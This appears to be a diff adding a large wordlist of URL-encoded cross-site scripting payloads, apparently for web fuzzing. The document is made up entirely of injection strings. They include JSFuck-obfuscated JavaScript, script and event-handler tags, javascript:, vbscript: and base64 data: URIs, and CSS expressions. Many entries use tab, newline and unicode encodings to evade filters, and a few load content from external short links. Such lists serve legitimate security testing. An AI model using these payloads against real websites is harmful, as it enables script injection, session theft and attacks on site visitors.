[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])();%20%22  
+%22;%20eval('/u0061'+'/x6c'+'e'+'r'+'t')(2);%20%22  
+%22;%20alert&  
+%22;%20javascript:&  
+%22;%20javascript:window.open('data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==');%20%22  
+%22onmouseover=%22alert(1)  
+&  
+%22onmouseover=%22alert(1)  
+&quot;onmouseover=&quot;alert(1)  
+/u0022onmouseover=/u0022alert(1)  
+width:expression(prompt(1))  
+width:ex/**/pression(prompt(1))  
+width&  
+width:expression/28%20prompt%20/28%201%20/29%20/29  
+width:/0065/0078/0070/0072/0065/0073/0073/0069/006F/006E/0028/0070/0072/006F/006D/0070/0074/0028/0031/0029/0029%22  
+background-image:%20url(javascript:prompt(1))  
+%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20aaaaaaaaa%20aaaaaaaaaa%20href=j&  
+%22%3E%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20aaaaaaaaa%20aaaaaaaaaa%20href=j&  
+'%3E%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20aaaaaaaaa%20aaaaaaaaaa%20href=j&  
+%22%3E%3Cimg%20src=x%20onerror=window.open('http://www.opensecurity.in/');%3E  
+%3Cobject%20data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%3E%3C/object%3E  
+%22%3E%3Cobject%20data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%3E%3C/object%3E  
+'%3E%3Cobject%20data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%3E%3C/object%3E  
+%3Ca%20href=%22data:text/html;blabla,&  
+%22%3E%3Ca%20href=%22data:text/html;blabla,&  
+'%3E%3Ca%20href=%22data:text/html;blabla,&  
+%3Csvg+onload=confirm(1);%3E  
+%22%3E%3Csvg+onload=confirm(1);%3E  
+'%3E%3Csvg+onload=confirm(1);%3E  
+%3Csvg%20onload=prompt(1);%3E  
+%22%3E%3Csvg%20onload=prompt(1);%3E  
+'%3E%3Csvg%20onload=prompt(1);%3E  
+%3Cinput+onfocus=alert(1)%3E  
+%22%3E%3Cinput+onfocus=alert(1)%3E  
+'%3E%3Cinput+onfocus=alert(1)%3E  
+%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80  
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;  
+%3Ca%20href=%22j&  
+%22%3E%3Ca%20href=%22j&  
+'%3E%3Ca%20href=%22j&  
+%3Cscr/x00ipt%3Econfirm(1);%3C/scr/x00ipt%3E  
+%22%3E%3Cscr/x00ipt%3Econfirm(1);%3C/scr/x00ipt%3E  
+'%3E%3Cscr/x00ipt%3Econfirm(1);%3C/scr/x00ipt%3E  
+%3Csvg/onload=prompt(1);%3E  
+%22%3E%3Csvg/onload=prompt(1);%3E  
+'%3E%3Csvg/onload=prompt(1);%3E  
+%3Csvg%3E%3Cscript%3Ealert&  
+%22%3E%3Csvg%3E%3Cscript%3Ealert&  
+'%3E%3Csvg%3E%3Cscript%3Ealert&  
+%3Cisindex%20action=%22javas&Tab;cript:alert(1)%22%20type=image%3E  
+%22%3E%3Cisindex%20action=%22javas&Tab;cript:alert(1)%22%20type=image%3E  
+'%3E%3Cisindex%20action=%22javas&Tab;cript:alert(1)%22%20type=image%3E  
+%3Cform%20action='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'%3E%3Cbutton%3ECLICK  
+%22%3E%3Cform%20action='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'%3E%3Cbutton%3ECLICK  
+'%3E%3Cform%20action='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'%3E%3Cbutton%3ECLICK  
+%3Cform%20action='java&Tab;scri&Tab;pt:alert(1)'%3E%3Cbutton%3ECLICK  
+%22%3E%3Cform%20action='java&Tab;scri&Tab;pt:alert(1)'%3E%3Cbutton%3ECLICK  
+'%3E%3Cform%20action='java&Tab;scri&Tab;pt:alert(1)'%3E%3Cbutton%3ECLICK  
+%3Cform%20action=javascript&NewLine;:alert(1)%3E%3Cinput%20type=submit%3E  
+%22%3E%3Cform%20action=javascript&NewLine;:alert(1)%3E%3Cinput%20type=submit%3E  
+'%3E%3Cform%20action=javascript&NewLine;:alert(1)%3E%3Cinput%20type=submit%3E  
+%3Cform%20action=%22javas&Tab;cript:alert(1)%22%20method=%22get%22%3E%3Cinput%20type=%22submit%22%20value=%22Submit%22%3E%3C/form%3E  
+%22%3E%3Cform%20action=%22javas&Tab;cript:alert(1)%22%20method=%22get%22%3E%3Cinput%20type=%22submit%22%20value=%22Submit%22%3E%3C/form%3E  
+'%3E%3Cform%20action=%22javas&Tab;cript:alert(1)%22%20method=%22get%22%3E%3Cinput%20type=%22submit%22%20value=%22Submit%22%3E%3C/form%3E  
+%3Cform%20action=%22&Tab;javas&Tab;cript&Tab;:alert('X%20:)')%22%20autocomplete=%22on%22%3E%20First%20name:%3Cinput%20type=%22text%22%20name=%22fname%22%3E%3Cbr%3E%3Cinput%20type=%22submit%22%3E%3C/form%3E  
+%22%3E%3Cform%20action=%22&Tab;javas&Tab;cript&Tab;:alert('X%20:)')%22%20autocomplete=%22on%22%3E%20First%20name:%3Cinput%20type=%22text%22%20name=%22fname%22%3E%3Cbr%3E%3Cinput%20type=%22submit%22%3E%3C/form%3E  
+'%3E%3Cform%20action=%22&Tab;javas&Tab;cript&Tab;:alert('X%20:)')%22%20autocomplete=%22on%22%3E%20First%20name:%3Cinput%20type=%22text%22%20name=%22fname%22%3E%3Cbr%3E%3Cinput%20type=%22submit%22%3E%3C/form%3E  
+%3Cform%20id=%22myform%22%20value=%22%22%20action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)%3E%3Ctextarea%3Ealert(1)%3C/textarea%3E%3Cinput%20type=%22submit%22%20value=%22Absenden%22%3E%3C/form%3E  
+%22%3E%3Cform%20id=%22myform%22%20value=%22%22%20action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)%3E%3Ctextarea%3Ealert(1)%3C/textarea%3E%3Cinput%20type=%22submit%22%20value=%22Absenden%22%3E%3C/form%3E  
+'%3E%3Cform%20id=%22myform%22%20value=%22%22%20action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)%3E%3Ctextarea%3Ealert(1)%3C/textarea%3E%3Cinput%20type=%22submit%22%20value=%22Absenden%22%3E%3C/form%3E  
+'%22%3E%3E%3Cmarquee%3E%3Cimg%20src=x%20onerror=confirm(1)%3E%3C/marquee%3E%22%3E%3C/plaintext/%3E%3C/%7C/%3E%3Cplaintext/onmouseover=prompt(1)  
+%22%3E%3C/plaintext/%3E%3C/%7C/%3E%3Cplaintext/onmouseover=prompt(1)  
+'%3E%3C/plaintext/%3E%3C/%7C/%3E%3Cplaintext/onmouseover=prompt(1)%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3Cscript%3Eprompt(1)%3C/script%3E@gmail.com%3Cisindex%20formaction=javascript:alert(/X/)%20type=submit%3E'--%3E%22%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%22%3E%3Cimg/id=%22confirm&lpar;1&  
+%3Cscript%3Evar%20url%20=%20%22%3C!--%3Cscript%3E%22;//%3C/script%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Evar%20url%20=%20%22%3C!--%3Cscript%3E%22;//%3C/script%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Evar%20url%20=%20%22%3C!--%3Cscript%3E%22;//%3C/script%3Ealert(1)%3C/script%3E  
+%3Cform%20id=%22myform%22%20value=%22%22+%7BvalueOf:location,length:1,__proto__:[],0:%22javascript%20:alert%20(1)%22%7D%22action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)%3E%3Ctextarea%3Ealert(1)%3C/textarea%3E%3Cinput%20type=%22submit%22%20value=%22Absenden%22%3E%3C/form%3E  
+%22%3E%3Cform%20id=%22myform%22%20value=%22%22+%7BvalueOf:location,length:1,__proto__:[],0:%22javascript%20:alert%20(1)%22%7D%22action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)%3E%3Ctextarea%3Ealert(1)%3C/textarea%3E%3Cinput%20type=%22submit%22%20value=%22Absenden%22%3E%3C/form%3E  
+'%3E%3Cform%20id=%22myform%22%20value=%22%22+%7BvalueOf:location,length:1,__proto__:[],0:%22javascript%20:alert%20(1)%22%7D%22action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)%3E%3Ctextarea%3Ealert(1)%3C/textarea%3E%3Cinput%20type=%22submit%22%20value=%22Absenden%22%3E%3C/form%3E  
+%3Csvg/contentScriptType=text/vbs%3E%3Cscript%3EExecute(MsgBox(chr(75)&chr(67)&chr(70)))  
+%22%3E%3Csvg/contentScriptType=text/vbs%3E%3Cscript%3EExecute(MsgBox(chr(75)&chr(67)&chr(70)))  
+'%3E%3Csvg/contentScriptType=text/vbs%3E%3Cscript%3EExecute(MsgBox(chr(75)&chr(67)&chr(70)))  
+%3Cimg/src='http://127.0.0.1:3555/xss_serve_payloads/X.jpg'%20onmouseover=&Tab;prompt(1)  
+%22%3E%3Cimg/src='http://127.0.0.1:3555/xss_serve_payloads/X.jpg'%20onmouseover=&Tab;prompt(1)  
+'%3E%3Cimg/src='http://127.0.0.1:3555/xss_serve_payloads/X.jpg'%20onmouseover=&Tab;prompt(1)  
+%3Csvg%3E%3Cscript%3Ealert&  
+%22%3E%3Csvg%3E%3Cscript%3Ealert&  
+'%3E%3Csvg%3E%3Cscript%3Ealert&  
+%3Cembed/src=//goo.gl/nlX0P%3E  
+%22%3E%3Cembed/src=//goo.gl/nlX0P%3E  
+'%3E%3Cembed/src=//goo.gl/nlX0P%3E  
+%3Cobject/data=//goo.gl/nlX0P%3E  
+%22%3E%3Cobject/data=//goo.gl/nlX0P%3E  
+'%3E%3Cobject/data=//goo.gl/nlX0P%3E  
+javascript:confirm(1)  
+javascript:confirm(1);  
+javascript:alert(1)  
+javascript:alert(1);  
+avascript&  
+javaSCRIPT&colon;alert(1)  
+JaVaScRipT:alert(1)  
+javas&Tab;cript:/u0061lert(1);  
+javascript:/u0061lert&  
+javascript&  
+javascript&colon;alert(1)  
+javascript&  
+j&  
+vbscript:alert(1);  
+vbscript&  
+vbscr&Tab;ipt:alert(1)%22  
+%3Ciframesrc=%22javascript:alert(2)%22%3E  
+%22%3E%3Ciframesrc=%22javascript:alert(2)%22%3E  
+'%3E%3Ciframesrc=%22javascript:alert(2)%22%3E  
+%3Ciframe/src=%22data:text&sol;html;&Tab;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E  
+%22%3E%3Ciframe/src=%22data:text&sol;html;&Tab;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E  
+'%3E%3Ciframe/src=%22data:text&sol;html;&Tab;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E  
+%3Cisindexformaction=%22javascript:alert(1)%22%20type=image%3E  
+%22%3E%3Cisindexformaction=%22javascript:alert(1)%22%20type=image%3E  
+'%3E%3Cisindexformaction=%22javascript:alert(1)%22%20type=image%3E  
+%3Cinput%20type=%22image%22%20formaction=JaVaScript:alert(0)%3E  
+%22%3E%3Cinput%20type=%22image%22%20formaction=JaVaScript:alert(0)%3E  
+'%3E%3Cinput%20type=%22image%22%20formaction=JaVaScript:alert(0)%3E  
+%3Cform%3E%3Cbutton%20formaction=javascript&colon;alert(1)%3ECLICKME  
+%22%3E%3Cform%3E%3Cbutton%20formaction=javascript&colon;alert(1)%3ECLICKME  
+'%3E%3Cform%3E%3Cbutton%20formaction=javascript&colon;alert(1)%3ECLICKME  
+%3Cform%20action=%22Javascript:alert(1)%22%3E%3Cinput%20type=submit%3E  
+%22%3E%3Cform%20action=%22Javascript:alert(1)%22%3E%3Cinput%20type=submit%3E  
+'%3E%3Cform%20action=%22Javascript:alert(1)%22%3E%3Cinput%20type=submit%3E  
+%3Cisindex%20action=%22javascript:alert(1)%22%20type=image%3E  
+%22%3E%3Cisindex%20action=%22javascript:alert(1)%22%20type=image%3E  
+'%3E%3Cisindex%20action=%22javascript:alert(1)%22%20type=image%3E  
+%3Cisindex%20action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)%20type=image%3E  
+%22%3E%3Cisindex%20action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)%20type=image%3E  
+'%3E%3Cisindex%20action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)%20type=image%3E  
+%3Cisindex%20action=data:text/html,%20type=image%3E  
+%22%3E%3Cisindex%20action=data:text/html,%20type=image%3E  
+'%3E%3Cisindex%20action=data:text/html,%20type=image%3E  
+%E2%80%9C/%3E%3Cmarquee%20onfinish=confirm(1)%3Ea%3C/marquee%3E  
+%3Cobject%20data='data:text/xml,%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%20%22%3Econfirm(1)%3C/script%3E%3E'%3E  
+%22%3E%3Cobject%20data='data:text/xml,%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%20%22%3Econfirm(1)%3C/script%3E%3E'%3E  
+'%3E%3Cobject%20data='data:text/xml,%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%20%22%3Econfirm(1)%3C/script%3E%3E'%3E  
+%3Cimg%20src=%20%22a%22%20onerror=%20'eval(atob(%22cHJvbXB0KDEpOw==%22))'  
+%22%3E%3Cimg%20src=%20%22a%22%20onerror=%20'eval(atob(%22cHJvbXB0KDEpOw==%22))'  
+'%3E%3Cimg%20src=%20%22a%22%20onerror=%20'eval(atob(%22cHJvbXB0KDEpOw==%22))'  
+%3Cscript%3Ealert('X')%3C/script%3E=a  
+%22%3E%3Cscript%3Ealert('X')%3C/script%3E=a  
+'%3E%3Cscript%3Ealert('X')%3C/script%3E=a  
+%3Cscript%3Edocument.write(toStaticHTML(%22%3Cstyle%3Ediv%7Bfont-family:rgb('0,0,0)'''%7Dfoo');color=expression(alert(1));%7B%7D%3C/style%3E%3Cdiv%3EPOC%3C/div%3E%22))%3C/script%3E  
+%22%3E%3Cscript%3Edocument.write(toStaticHTML(%22%3Cstyle%3Ediv%7Bfont-family:rgb('0,0,0)'''%7Dfoo');color=expression(alert(1));%7B%7D%3C/style%3E%3Cdiv%3EPOC%3C/div%3E%22))%3C/script%3E  
+'%3E%3Cscript%3Edocument.write(toStaticHTML(%22%3Cstyle%3Ediv%7Bfont-family:rgb('0,0,0)'''%7Dfoo');color=expression(alert(1));%7B%7D%3C/style%3E%3Cdiv%3EPOC%3C/div%3E%22))%3C/script%3E  
+';!--%22%3CXSS%3E%3Cscript%3Ealert(1);%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1);%3C/script%3E  
+'%3E%3Cscript%3Ealert(1);%3C/script%3E=%7B()%7D  
+%3Cscript%3Edocument.body.innerHTML=%22%3Ca%20onmouseover%0B=location='/x6A/x61/x76/x61/x53/x43/x52/x49/x50/x54/x26/x63/x6F/x6C/x6F/x6E/x3B/x61/x6C/x65/x72/x74/x26/x6C/x70/x61/x72/x3B/x31/x26/x72/x70/x61/x72/x3B'%3E%3Cinput%20name=attributes%3E%22;%3C/script%3E  
+%22%3E%3Cscript%3Edocument.body.innerHTML=%22%3Ca%20onmouseover%0B=location='/x6A/x61/x76/x61/x53/x43/x52/x49/x50/x54/x26/x63/x6F/x6C/x6F/x6E/x3B/x61/x6C/x65/x72/x74/x26/x6C/x70/x61/x72/x3B/x31/x26/x72/x70/x61/x72/x3B'%3E%3Cinput%20name=attributes%3E%22;%3C/script%3E  
+'%3E%3Cscript%3Edocument.body.innerHTML=%22%3Ca%20onmouseover%0B=location='/x6A/x61/x76/x61/x53/x43/x52/x49/x50/x54/x26/x63/x6F/x6C/x6F/x6E/x3B/x61/x6C/x65/x72/x74/x26/x6C/x70/x61/x72/x3B/x31/x26/x72/x70/x61/x72/x3B'%3E%3Cinput%20name=attributes%3E%22;%3C/script%3E  
+asfunction:getURL,javascript:alert(1)//  
+/%22))%7Dcatch(e)%7B%7Dif(!self.a)self.a=!alert(1)//  
+%22]%29;%7Dcatch%28e%29%7B%7Dif%28!self.a%29self.a=!alert%281%29;//  
+0%5C%22))%7Dcatch(e)%7Bif(!window.x)%7Bwindow.x=1;alert(1)%7D%7D//  
+%3Cbutton/onclick=alert(1)%20%3EX%3C/button%3E  
+%22%3E%3Cbutton/onclick=alert(1)%20%3EX%3C/button%3E  
+'%3E%3Cbutton/onclick=alert(1)%20%3EX%3C/button%3E  
+%3Ca%20onmouseover=(alert(1))%3EX%3C/a%3E  
+%22%3E%3Ca%20onmouseover=(alert(1))%3EX%3C/a%3E  
+'%3E%3Ca%20onmouseover=(alert(1))%3EX%3C/a%3E  
+%3Cp/onmouseover=javascript:alert(1);%20%3EX%3C/p%3E  
+%22%3E%3Cp/onmouseover=javascript:alert(1);%20%3EX%3C/p%3E  
+'%3E%3Cp/onmouseover=javascript:alert(1);%20%3EX%3C/p%3E  
+%3Carticle%20xmlns=%22%3E%3Cimg%20src=x%20onerror=alert(1)%22%3E%3C/article%3E  
+%22%3E%3Carticle%20xmlns=%22%3E%3Cimg%20src=x%20onerror=alert(1)%22%3E%3C/article%3E  
+'%3E%3Carticle%20xmlns=%22%3E%3Cimg%20src=x%20onerror=alert(1)%22%3E%3C/article%3E  
+%3Carticle%20xmlns=%22x:img%20src=x%20onerror=alert(1)%20%22%3E  
+%22%3E%3Carticle%20xmlns=%22x:img%20src=x%20onerror=alert(1)%20%22%3E  
+'%3E%3Carticle%20xmlns=%22x:img%20src=x%20onerror=alert(1)%20%22%3E  
+%3Cp%20style=%22font-family:'/22/3bx:expression(alert(1))/*'%22%3E  
+%22%3E%3Cp%20style=%22font-family:'/22/3bx:expression(alert(1))/*'%22%3E  
+'%3E%3Cp%20style=%22font-family:'/22/3bx:expression(alert(1))/*'%22%3E  
+%3Csvg%3E%3Cstyle%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/svg%3E  
+%22%3E%3Csvg%3E%3Cstyle%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/svg%3E  
+'%3E%3Csvg%3E%3Cstyle%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/svg%3E  
+%22%3E%3Csvg%3E%3Cstyle%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/svg%3E  
+%22%3E%3Csvg%3E%3Cstyle%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/svg%3E  
+'%3E%3Csvg%3E%3Cstyle%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/svg%3E  
+'%3E%3Csvg%3E%3Cstyle%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/svg%3E  
+%22%3E%3Csvg%3E%3Cstyle%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/svg%3E  
+'%3E%3Csvg%3E%3Cstyle%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/svg%3E  
+%3Clisting%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/listing%3E  
+%22%3E%3Clisting%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/listing%3E  
+'%3E%3Clisting%3E&ltimg%20src=x%20onerror=alert(1)&gt%3C/listing%3E  
+%22onmouseover=alert(1);a=%22  
+'+alert(1)&&null=='  
++alert(1)&&null=='  
+///'%3E%3Cscript%3E1%3C///script%3E  
+///'%3E%3Cbody%20onload=///'1///'%3E  
+/%22%3E%3Cscript%3E1%3C///script%3E  
+%3E%3Cscript%3E1%3C///script%3E  
+/%22%3E%3Cbody%20onload=/%221/%22%3E  
+%3Cimg%20src=/%22x:X/%22%20onerror=/%22alert(1)/%22%3E  
+%22%3E%3Cimg%20src=/%22x:X/%22%20onerror=/%22alert(1)/%22%3E  
+'%3E%3Cimg%20src=/%22x:X/%22%20onerror=/%22alert(1)/%22%3E  
+%3Cimg%20src=a%20onerror=alert(1)  
+%22%3E%3Cimg%20src=a%20onerror=alert(1)  
+'%3E%3Cimg%20src=a%20onerror=alert(1)  
+%3Cscript%3Ealert(/'1/')%3C/script%3E  
+%22%3E%3Cscript%3Ealert(/'1/')%3C/script%3E  
+'%3E%3Cscript%3Ealert(/'1/')%3C/script%3E  
+%3Cscript%3Ealert(/'////1/////')%3C/script%3E  
+%22%3E%3Cscript%3Ealert(/'////1/////')%3C/script%3E  
+'%3E%3Cscript%3Ealert(/'////1/////')%3C/script%3E  
+%3Cscript%3Ealert(/'/////1//////')%3C/script%3E  
+%22%3E%3Cscript%3Ealert(/'/////1//////')%3C/script%3E  
+'%3E%3Cscript%3Ealert(/'/////1//////')%3C/script%3E  
+/'/'/%22%3E  
+%3Cscript%3Ealert(1);%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1);%3C/script%3E  
+'%3E%3Cscript%3Ealert(1);%3C/script%3E  
+%3C%0ascript%3Ealert(1);%3C/script%3E  
+%22%3E%3C%0ascript%3Ealert(1);%3C/script%3E  
+'%3E%3C%0ascript%3Ealert(1);%3C/script%3E  
+%3C%0bscript%3Ealert(1);%3C/script%3E  
+%22%3E%3C%0bscript%3Ealert(1);%3C/script%3E  
+'%3E%3C%0bscript%3Ealert(1);%3C/script%3E  
+%3C!--[if]%3E%3Cscript%3Ealert(1)%3C/script%20--%3E  
+%22%3E%3C!--[if]%3E%3Cscript%3Ealert(1)%3C/script%20--%3E  
+'%3E%3C!--[if]%3E%3Cscript%3Ealert(1)%3C/script%20--%3E  
+%3CSCRIPT%3E%20alert(/%221/%22);%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3E%20alert(/%221/%22);%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3E%20alert(/%221/%22);%3C/SCRIPT%3E  
+%3CSCRIPT%3E%20alert(/%221/%22)%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3E%20alert(/%221/%22)%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3E%20alert(/%221/%22)%3C/SCRIPT%3E  
+%3Cscript%3Ealert([!![]]%20[])%3C/script%3E  
+%22%3E%3Cscript%3Ealert([!![]]%20[])%3C/script%3E  
+'%3E%3Cscript%3Ealert([!![]]%20[])%3C/script%3E  
+%3Cvar%20onmouseover=%22prompt(1)%22%3EX%3C/var%3E  
+%22%3E%3Cvar%20onmouseover=%22prompt(1)%22%3EX%3C/var%3E  
+'%3E%3Cvar%20onmouseover=%22prompt(1)%22%3EX%3C/var%3E  
+%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80%E2%80%8B  
+%3Cinput%20type=%22text%22%20value=%60%60%3Cdiv/onmouseover='alert(1)'%3EX%3C/div%3E  
+%22%3E%3Cinput%20type=%22text%22%20value=%60%60%3Cdiv/onmouseover='alert(1)'%3EX%3C/div%3E  
+'%3E%3Cinput%20type=%22text%22%20value=%60%60%3Cdiv/onmouseover='alert(1)'%3EX%3C/div%3E  
+%3Ciframe%20%20src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29%3E%3C/iframe%3E%20%E2%80%8B  
+%22%3E%3Ciframe%20%20src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29%3E%3C/iframe%3E%20%E2%80%8B  
+'%3E%3Ciframe%20%20src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29%3E%3C/iframe%3E%20%E2%80%8B  
